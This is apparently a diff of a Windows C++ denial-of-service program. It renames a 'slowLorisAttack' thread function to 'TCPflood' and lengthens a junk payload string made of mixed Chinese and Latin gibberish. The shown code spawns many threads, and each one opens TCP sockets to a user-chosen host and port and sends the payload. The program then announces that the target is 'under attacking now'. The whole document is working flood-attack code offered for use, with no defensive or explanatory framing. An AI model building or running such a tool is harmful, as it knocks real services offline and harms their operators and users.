@@ -12,7 +12,7 @@ string threads;
 hostent *host;
 sockaddr_in socket_address;
 WSADATA wd;
-DWORD WINAPI slowLorisAttack(PVOID p) 
+DWORD WINAPI TCPflood(PVOID p) 
 {
 	sockaddr_in *socket_address;
 	SOCKET s;
@@ -21,7 +21,7 @@ DWORD WINAPI slowLorisAttack(PVOID p)
 	{
 		unsigned long ul=1;
 		s=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP); 
-		char kkk[]="举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu从变速箱担心成都市九年喜欢急促地从你觉得你熟sdhydus悉环境课程的武术的小女孩觉ccs得不错i的话你就你刷新缓存内粗不是喜欢u上下班思想shucunsdhysud啊u百度sdjhcuewqunj赵duyd紫sZZCjas辰sdf安徽的很季后举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu从变速箱担心成都市九年喜欢急促地从你觉得你熟sdhydus悉环境课程的武术的小女孩觉ccs得不错i的话你就你刷新缓存内粗不是喜欢u上下班思想shucunsdhysud啊u百度sdjhcuewqunj赵duyd紫sZZCjas辰sdf安徽的很季后举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCuduyd紫sZZCjas辰sdf安徽的很季后举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu从变速箱担心成都市九年喜欢急促地从你觉得你熟sdhydus悉环境课程的武术的小女孩觉ccs得不错i的话你就你刷新缓存内粗不是喜欢u上下班思想shucunsdhysud啊u百度sdjhcuewqunj赵duyd紫sZZCjas辰sdf安徽的很季后举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu\r\n";
+		char kkk[]="举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu从变速箱担心成都市九年喜欢急促地从你觉得你熟sdhydus悉环境课程的武术的小女孩觉ccs得不错i的话你就你刷新缓存内粗不是喜欢u上下班思想shucunsdhysud啊u百度sdjhcuewqunj赵duyd紫sZZCjas辰sdf安徽的很季后举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu从变速箱担心成都市九年喜欢急促地从你觉得你熟sdhydus悉环境课程的武术的小女孩觉ccs得不错i的话你就你刷新缓存内粗不是喜欢u上下班思想shucunsdhysud啊u百度sdjhcuewqunj赵duyd紫sZZCjas辰sdf安徽的很季后举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCuduyd紫sZZCjas辰sdf安徽的很季后举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu从变速箱担心成都市九年喜欢急促地从你觉得你熟sdhydus悉环境课程的武术的小女孩觉ccs得不错i的话你就你刷新缓存内粗不是喜欢u上下班思想shucunsdhysud啊u百度sdjhcuewqunj赵duyd紫sZZCjas辰sdf安徽的很季后举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu从变速箱担心成都市九年喜欢急促地从你觉得你熟sdhydus悉环境课程的武术的小女孩觉ccs得不错i的话你就你刷新缓存内粗不是喜欢u上下班思想shucunsdhysud啊u百度sdjhcuewqunj赵duyd紫sZZCjas辰sdf安徽的很季后举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu从变速箱担心成都市九年喜欢急促地从你觉得你熟sdhydus悉环境课程的武术的小女孩觉ccs得不错i的话你就你刷新缓存内粗不是喜欢u上下班思想shucunsdhysud啊u百度sd\r\n\r\n";
 		if(s!=INVALID_SOCKET) 
 		{
 			connect(s,(sockaddr*)socket_address,sizeof(sockaddr_in));
@@ -62,10 +62,10 @@ int main()
 	socket_address.sin_port = htons(strtoul(portNumber.data(),NULL,0));
 	for(register ULONG i=1;i<=strtoul(threads.data(),NULL,0);i++) 
 	{
-		 CreateThread(NULL,0,slowLorisAttack,&socket_address,0,NULL);
+		 CreateThread(NULL,0,TCPflood,&socket_address,0,NULL);
 		 cout<<i<<" threads created\n";
 	}
-	cout<<hostname+":"+portNumber<<" is under attacking now.\nPress any key to end.";
+	cout<<hostname+":"+portNumber<<" is under attacking now.\nPress any key to stop flooding attack.";
 	getch();
 	WSACleanup();
 	return 0;
